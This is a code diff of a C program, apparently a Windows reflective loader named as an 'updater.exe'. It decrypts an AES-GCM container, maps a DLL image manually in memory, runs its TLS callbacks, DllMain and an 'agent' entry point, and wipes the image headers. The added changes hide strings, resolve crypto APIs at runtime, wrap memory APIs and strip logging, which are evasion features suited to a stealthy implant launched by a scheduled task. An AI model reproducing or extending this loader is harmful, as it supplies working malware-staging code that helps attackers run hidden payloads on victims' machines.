+    h = fnv1a_path_ci(modulePath);
+    hex32_lower(hex, h);
+
+    /*
+     * Mutex 只绑定当前 updater.exe 所在目录。
+     * 用 Global namespace 是因为首发实例常由 scheduled task 启动，
+     * 二次双击/SSH 复测可能在另一个 Windows session；Local namespace
+     * 会让两个 session 各自创建同名 mutex，挡不住重复实例。
+     */
+    mutexName[0] = 'G';
+    mutexName[1] = 'l';
+    mutexName[2] = 'o';
+    mutexName[3] = 'b';
+    mutexName[4] = 'a';
+    mutexName[5] = 'l';
+    mutexName[6] = '\\';
+    mutexName[7] = 'u';
+    mutexName[8] = 'p';
+    mutexName[9] = 'd';
+    mutexName[10] = '_';
+    memcpy(mutexName + 11, hex, 9);
+
+    m = CreateMutexA(NULL, TRUE, mutexName);
+    if (!m) {
+        return 1;
+    }
+    if (GetLastError() == ERROR_ALREADY_EXISTS) {
+        CloseHandle(m);
+        return 0;
+    }
+    return 1;
 }
+#else
+static int acquire_single_instance(void)
+{
+    return 1;
+}
+#endif
 
 static int dhple2_magic_ok(const DHPLE2_HEADER* h)
 {
-    return h && dhple_magic_common_ok(h->magic, DHPLE_MAGIC5_V2);
-}
-
-static int derive_aes256_key_sha256(const char* passphrase, unsigned char outKey[32])
-{
-    BCRYPT_ALG_HANDLE hAlg = NULL;
-    BCRYPT_HASH_HANDLE hHash = NULL;
-    unsigned char* hashObject = NULL;
-    DWORD objectLength = 0;
-    DWORD hashLength = 0;
-    DWORD cb = 0;
-    NTSTATUS st;
-
-    if (!passphrase || !passphrase[0] || !outKey) return 0;
-    st = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0);
-    if (!NT_SUCCESS(st)) goto fail;
-    st = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&objectLength, sizeof(objectLength), &cb, 0);
-    if (!NT_SUCCESS(st) || !objectLength) goto fail;
-    st = BCryptGetProperty(hAlg, BCRYPT_HASH_LENGTH, (PUCHAR)&hashLength, sizeof(hashLength), &cb, 0);
-    if (!NT_SUCCESS(st) || hashLength != 32) goto fail;
-    hashObject = (unsigned char*)heap_alloc(objectLength);
-    if (!hashObject) goto fail;
-    st = BCryptCreateHash(hAlg, &hHash, hashObject, objectLength, NULL, 0, 0);
-    if (!NT_SUCCESS(st)) goto fail;
-    st = BCryptHashData(hHash, (PUCHAR)passphrase, (ULONG)strlen(passphrase), 0);
-    if (!NT_SUCCESS(st)) goto fail;
-    st = BCryptFinishHash(hHash, outKey, 32, 0);
-    if (!NT_SUCCESS(st)) goto fail;
-
-    BCryptDestroyHash(hHash);
-    SecureZeroMemory(hashObject, objectLength);
-    heap_free(hashObject);
-    BCryptCloseAlgorithmProvider(hAlg, 0);
-    return 1;
-
-fail:
-    if (hHash) BCryptDestroyHash(hHash);
-    if (hashObject) {
-        SecureZeroMemory(hashObject, objectLength);
-        heap_free(hashObject);
-    }
-    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
-    return 0;
+    return h &&
+        h->magic[0] == DHPLE_MAGIC0 &&
+        h->magic[1] == DHPLE_MAGIC1 &&
+        h->magic[2] == DHPLE_MAGIC2 &&
+        h->magic[3] == DHPLE_MAGIC3 &&
+        h->magic[4] == DHPLE_MAGIC4 &&
+        h->magic[5] == DHPLE_MAGIC5_V2 &&
+        h->magic[6] == 0 &&
+        h->magic[7] == 0;
 }
 
 static int derive_aes256_key_pbkdf2_sha256(const char* passphrase, const unsigned char* salt, DWORD saltLen, ULONGLONG iterations, unsigned char outKey[32])
@@ -499,31 +865,62 @@ static int derive_aes256_key_pbkdf2_sha256(const char* passphrase, const unsigne
     NTSTATUS st;
 
     if (!passphrase || !passphrase[0] || !salt || !saltLen || !iterations || !outKey) return 0;
+#if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
+    if (!resolve_dynamic_bcrypt()) return 0;
+#endif
     /*
      * DHPLE2 使用 PBKDF2-HMAC-SHA256：
      * - passphrase 仍由命令行传入；
      * - salt 存在 DHPLE2 header 后面，每个容器随机生成；
      * - iterations 也写在容器里，Windows 侧按同样参数复现 key。
      */
+    #if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
+    st = g_pBCryptOpenAlgorithmProvider(&hPrf, BCRYPT_SHA256_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG);
+    #else
     st = BCryptOpenAlgorithmProvider(&hPrf, BCRYPT_SHA256_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG);
+    #endif
     if (!NT_SUCCESS(st)) goto fail;
+    #if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
+    st = g_pBCryptDeriveKeyPBKDF2(
+            hPrf,
+            (PUCHAR)passphrase,
+            (ULONG)strlen(passphrase),
+            (PUCHAR)salt,
+            saltLen,
+            iterations,
+            outKey,
+            32,
+            0
+        );
+    #else
     st = BCryptDeriveKeyPBKDF2(
-        hPrf,
-        (PUCHAR)passphrase,
-        (ULONG)strlen(passphrase),
-        (PUCHAR)salt,
-        saltLen,
-        iterations,
-        outKey,
-        32,
-        0
-    );
+            hPrf,
+            (PUCHAR)passphrase,
+            (ULONG)strlen(passphrase),
+            (PUCHAR)salt,
+            saltLen,
+            iterations,
+            outKey,
+            32,
+            0
+        );
+    #endif
     if (!NT_SUCCESS(st)) goto fail;
+    #if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
+    g_pBCryptCloseAlgorithmProvider(hPrf, 0);
+    #else
     BCryptCloseAlgorithmProvider(hPrf, 0);
+    #endif
     return 1;
 
 fail:
-    if (hPrf) BCryptCloseAlgorithmProvider(hPrf, 0);
+    if (hPrf) {
+        #if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
+        g_pBCryptCloseAlgorithmProvider(hPrf, 0);
+        #else
+        BCryptCloseAlgorithmProvider(hPrf, 0);
+        #endif
+    }
     return 0;
 }
 
@@ -554,16 +951,35 @@ static int decrypt_cipher_aes_gcm_with_key(
     if (!nonce || !nonceLen || !tag || !tagLen || !cipher || !cipherSize || !plainSize || !aad || !aadLen || !key || !outPlain || !outPlainSize) return 0;
     *outPlain = NULL;
     *outPlainSize = 0;
+#if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
+    if (!resolve_dynamic_bcrypt()) return 0;
+#endif
 
+    #if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
+    st = g_pBCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
+    #else
     st = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
+    #endif
     if (!NT_SUCCESS(st)) goto fail;
+    #if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
+    st = g_pBCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
+    #else
     st = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
+    #endif
     if (!NT_SUCCESS(st)) goto fail;
+    #if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
+    st = g_pBCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&keyObjectLength, sizeof(keyObjectLength), &cb, 0);
+    #else
     st = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&keyObjectLength, sizeof(keyObjectLength), &cb, 0);
+    #endif
     if (!NT_SUCCESS(st) || !keyObjectLength) goto fail;
     keyObject = (unsigned char*)heap_alloc(keyObjectLength);
     if (!keyObject) goto fail;
+    #if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
+    st = g_pBCryptGenerateSymmetricKey(hAlg, &hKey, keyObject, keyObjectLength, (PUCHAR)key, 32, 0);
+    #else
     st = BCryptGenerateSymmetricKey(hAlg, &hKey, keyObject, keyObjectLength, (PUCHAR)key, 32, 0);
+    #endif
     if (!NT_SUCCESS(st)) goto fail;
 
     plain = (unsigned char*)heap_alloc(plainSize);
@@ -576,15 +992,31 @@ static int decrypt_cipher_aes_gcm_with_key(
     authInfo.pbAuthData = (PUCHAR)aad;
     authInfo.cbAuthData = aadLen;
 
+    #if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
+    st = g_pBCryptDecrypt(hKey, (PUCHAR)cipher, cipherSize, &authInfo, NULL, 0, plain, plainSize, &resultSize, 0);
+    #else
     st = BCryptDecrypt(hKey, (PUCHAR)cipher, cipherSize, &authInfo, NULL, 0, plain, plainSize, &resultSize, 0);
+    #endif
     if (!NT_SUCCESS(st) || resultSize != plainSize) goto fail;
 
-    if (hKey) BCryptDestroyKey(hKey);
+    if (hKey) {
+        #if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
+        g_pBCryptDestroyKey(hKey);
+        #else
+        BCryptDestroyKey(hKey);
+        #endif
+    }
     if (keyObject) {
         SecureZeroMemory(keyObject, keyObjectLength);
         heap_free(keyObject);
     }
-    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
+    if (hAlg) {
+        #if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
+        g_pBCryptCloseAlgorithmProvider(hAlg, 0);
+        #else
+        BCryptCloseAlgorithmProvider(hAlg, 0);
+        #endif
+    }
     *outPlain = plain;
     *outPlainSize = plainSize;
     return 1;
@@ -594,12 +1026,24 @@ fail:
         SecureZeroMemory(plain, plainSize);
         heap_free(plain);
     }
-    if (hKey) BCryptDestroyKey(hKey);
+    if (hKey) {
+        #if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
+        g_pBCryptDestroyKey(hKey);
+        #else
+        BCryptDestroyKey(hKey);
+        #endif
+    }
     if (keyObject) {
         SecureZeroMemory(keyObject, keyObjectLength);
         heap_free(keyObject);
     }
-    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
+    if (hAlg) {
+        #if defined(PROFILE_ONLY_DYNAMIC_BCRYPT)
+        g_pBCryptCloseAlgorithmProvider(hAlg, 0);
+        #else
+        BCryptCloseAlgorithmProvider(hAlg, 0);
+        #endif
+    }
     return 0;
 }
 
@@ -663,55 +1107,13 @@ static int decrypt_envelope_aes_gcm(const unsigned char* fileData, DWORD fileSiz
         }
         diag_log("DHPLE2_KEY_DERIVE_OK");
         ok = decrypt_cipher_aes_gcm_with_key(nonce, nonceLen, tag, tagLen, cipher, cipherSize, plainSize,
-                                             DHPLE_AAD_V2, (DWORD)(sizeof(DHPLE_AAD_V2) - 1), key, outPlain, outPlainSize);
+                                             DHPLE_AAD_V2, (DWORD)sizeof(DHPLE_AAD_V2), key, outPlain, outPlainSize);
         SecureZeroMemory(key, sizeof(key));
         if (!ok) {
             diag_log("DHPLE2_DECRYPT_ERROR");
             return 0;
         }
         diag_log("DHPLE2_DECRYPT_OK");
-        return 1;
-    }
-
-    if (fileSize >= sizeof(DHPLE1_HEADER) && dhple1_magic_ok((const DHPLE1_HEADER*)fileData)) {
-        const DHPLE1_HEADER* eh1 = (const DHPLE1_HEADER*)fileData;
-        diag_log("DHPLE1_HEADER_FOUND");
-        if (eh1->version != DHPLE1_VERSION || eh1->algorithm != DHPLE_ALG_AES256_GCM_SHA256_KEY ||
-            eh1->nonce_len != 12 || eh1->tag_len != 16 || eh1->plain_size == 0 || eh1->cipher_size == 0) {
-            diag_log("DHPLE1_HEADER_ERROR");
-            return 0;
-        }
-        offset = (DWORD)sizeof(DHPLE1_HEADER);
-        if (!range_ok(offset, eh1->nonce_len, fileSize)) return 0;
-        nonce = fileData + offset;
-        offset += eh1->nonce_len;
-        if (!range_ok(offset, eh1->tag_len, fileSize)) return 0;
-        tag = fileData + offset;
-        offset += eh1->tag_len;
-        if (!range_ok(offset, eh1->cipher_size, fileSize)) return 0;
-        if (offset + eh1->cipher_size != fileSize) {
-            diag_log("DHPLE1_SIZE_MISMATCH");
-            return 0;
-        }
-        cipher = fileData + offset;
-        plainSize = eh1->plain_size;
-        cipherSize = eh1->cipher_size;
-        nonceLen = eh1->nonce_len;
-        tagLen = eh1->tag_len;
-
-        if (!derive_aes256_key_sha256(passphrase, key)) {
-            diag_log("DHPLE1_KEY_DERIVE_ERROR");
-            SecureZeroMemory(key, sizeof(key));
-            return 0;
-        }
-        ok = decrypt_cipher_aes_gcm_with_key(nonce, nonceLen, tag, tagLen, cipher, cipherSize, plainSize,
-                                             DHPLE_AAD_V1, (DWORD)(sizeof(DHPLE_AAD_V1) - 1), key, outPlain, outPlainSize);
-        SecureZeroMemory(key, sizeof(key));
-        if (!ok) {
-            diag_log("DHPLE1_DECRYPT_ERROR");
-            return 0;
-        }
-        diag_log("DHPLE1_DECRYPT_OK");
         return 1;
     }
 
@@ -913,7 +1315,7 @@ static int register_exception_table(const DHPL_HEADER* h, unsigned char* image)
         diag_log("DHPL_EXCEPTION_EMPTY");
         return 1;
     }
-    if (!RtlAddFunctionTable((PRUNTIME_FUNCTION)(void*)(image + h->exception_rva), count, (DWORD64)(ULONG_PTR)image)) {
+    if (!dhpl_add_function_table((PRUNTIME_FUNCTION)(void*)(image + h->exception_rva), count, (DWORD64)(ULONG_PTR)image)) {
         diag_log("DHPL_EXCEPTION_RTL_ADD_ERROR");
         return 0;
     }
@@ -929,11 +1331,9 @@ static int register_exception_table(const DHPL_HEADER* h, unsigned char* image)
 static int protect_sections(const unsigned char* container, const DHPL_HEADER* h, unsigned char* image)
 {
     DWORD i;
-    SYSTEM_INFO si;
     DWORD page;
     const DHPL_SECTION* secs = (const DHPL_SECTION*)(container + h->sections_offset);
-    GetSystemInfo(&si);
-    page = si.dwPageSize ? si.dwPageSize : 0x1000;
+    page = dhpl_get_page_size();
     for (i = 0; i < h->section_count; i++) {
         const DHPL_SECTION* s = &secs[i];
         DWORD oldProtect = 0;
@@ -946,7 +1346,7 @@ static int protect_sections(const unsigned char* container, const DHPL_HEADER* h
             return 0;
         }
         size = end - start;
-        if (!VirtualProtect(image + start, size, s->protect, &oldProtect)) {
+        if (!dhpl_virtual_protect(image + start, size, s->protect, &oldProtect)) {
             diag_log_num("DHPL_PROTECT_ERROR_INDEX", i);
             return 0;
         }
@@ -989,17 +1389,15 @@ static int call_dllmain(const DHPL_HEADER* h, unsigned char* image)
 
 static int zero_and_protect_headers(const DHPL_HEADER* h, unsigned char* image)
 {
-    SYSTEM_INFO si;
     DWORD page;
     DWORD headerSize;
     DWORD oldProtect = 0;
-    GetSystemInfo(&si);
-    page = si.dwPageSize ? si.dwPageSize : 0x1000;
+    page = dhpl_get_page_size();
     headerSize = h->size_of_headers ? h->size_of_headers : page;
     headerSize = align_up_dword(headerSize, page);
     if (headerSize > h->image_size) headerSize = page;
     SecureZeroMemory(image, headerSize);
-    if (!VirtualProtect(image, headerSize, PAGE_READONLY, &oldProtect)) {
+    if (!dhpl_virtual_protect(image, headerSize, PAGE_READONLY, &oldProtect)) {
         diag_log("DHPL_HEADER_PROTECT_ERROR");
         return 0;
     }
@@ -1051,9 +1449,9 @@ static int run_loader(const char* containerPath, const char* key)
     diag_log_num("DHPL_TLS_COUNT", h->tls_count);
     diag_log_num("DHPL_RUN_AGENT_RVA", h->run_agent_rva);
 
-    image = (unsigned char*)VirtualAlloc((LPVOID)(ULONG_PTR)h->preferred_base, h->image_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    image = (unsigned char*)dhpl_virtual_alloc((LPVOID)(ULONG_PTR)h->preferred_base, h->image_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
     if (!image) {
-        image = (unsigned char*)VirtualAlloc(NULL, h->image_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+        image = (unsigned char*)dhpl_virtual_alloc(NULL, h->image_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
     }
     if (!image) {
         diag_log("DHPL_ALLOC_ERROR");
@@ -1064,56 +1462,56 @@ static int run_loader(const char* containerPath, const char* key)
     diag_log_hex64("DHPL_IMAGE_BASE", (ULONGLONG)(ULONG_PTR)image);
 
     if (!copy_sections(container, h, image)) {
-        VirtualFree(image, 0, MEM_RELEASE);
+        dhpl_virtual_free(image, 0, MEM_RELEASE);
         heap_secure_free(container, containerSize);
         return 40;
     }
     diag_log("DHPL_SECTIONS_OK");
 
     if (!apply_relocations(container, h, image, (ULONGLONG)(ULONG_PTR)image)) {
-        VirtualFree(image, 0, MEM_RELEASE);
+        dhpl_virtual_free(image, 0, MEM_RELEASE);
         heap_secure_free(container, containerSize);
         return 40;
     }
     diag_log("DHPL_RELOC_OK");
 
     if (!resolve_imports(container, h, image)) {
-        VirtualFree(image, 0, MEM_RELEASE);
+        dhpl_virtual_free(image, 0, MEM_RELEASE);
         heap_secure_free(container, containerSize);
         return 50;
     }
     diag_log("DHPL_IMPORT_OK");
 
     if (!register_exception_table(h, image)) {
-        VirtualFree(image, 0, MEM_RELEASE);
+        dhpl_virtual_free(image, 0, MEM_RELEASE);
         heap_secure_free(container, containerSize);
         return 50;
     }
     diag_log("DHPL_EXCEPTION_OK");
 
     if (!protect_sections(container, h, image)) {
-        VirtualFree(image, 0, MEM_RELEASE);
+        dhpl_virtual_free(image, 0, MEM_RELEASE);
         heap_secure_free(container, containerSize);
         return 40;
     }
     diag_log("DHPL_PROTECT_OK");
 
     if (!call_tls_callbacks(container, h, image)) {
-        VirtualFree(image, 0, MEM_RELEASE);
+        dhpl_virtual_free(image, 0, MEM_RELEASE);
         heap_secure_free(container, containerSize);
         return 60;
     }
     diag_log("DHPL_TLS_OK");
 
     if (!call_dllmain(h, image)) {
-        VirtualFree(image, 0, MEM_RELEASE);
+        dhpl_virtual_free(image, 0, MEM_RELEASE);
         heap_secure_free(container, containerSize);
         return 60;
     }
     diag_log("DHPL_DLLMAIN_OK");
 
     if (!zero_and_protect_headers(h, image)) {
-        VirtualFree(image, 0, MEM_RELEASE);
+        dhpl_virtual_free(image, 0, MEM_RELEASE);
         heap_secure_free(container, containerSize);
         return 40;
     }
@@ -1149,19 +1547,26 @@ static int run_loader(const char* containerPath, const char* key)
 
 int main(int argc, char** argv)
 {
-    const char* containerPath = argc > 1 ? argv[1] : "cache.dhpl";
-    char* ownedKey = NULL;
-    const char* key = resolve_key_source(argc > 2 ? argv[2] : NULL, &ownedKey);
+    const char* containerPath = argc > 1 ? argv[1] : resolve_default_container_path();
+    const char* key = resolve_key_source(argc > 2 ? argv[2] : NULL);
     int rc;
     touch_release_markers();
+#if defined(PROFILE_ONLY_DIAG)
     g_log_path = argc > 3 ? argv[3] : NULL;
-    if (!g_log_path || !g_log_path[0]) g_log_path = getenv("DHPL_LOADER_LOG");
+#if !defined(PROFILE_ONLY_NO_LOG_ENV)
+    if (!g_log_path || !g_log_path[0]) g_log_path = getenv(get_log_env_name());
+#endif
+#else
+    (void)argc;
+    (void)argv;
+#endif
+    if (!acquire_single_instance()) {
+        return 0;
+    }
     if (!key || !key[0]) {
         diag_log("DHPL_KEY_RESOLVE_ERROR");
-        if (ownedKey) heap_secure_free((unsigned char*)ownedKey, (DWORD)strlen(ownedKey));
         return 5;
     }
     rc = run_loader(containerPath, key);
-    if (ownedKey) heap_secure_free((unsigned char*)ownedKey, (DWORD)strlen(ownedKey));
     return rc;
 }
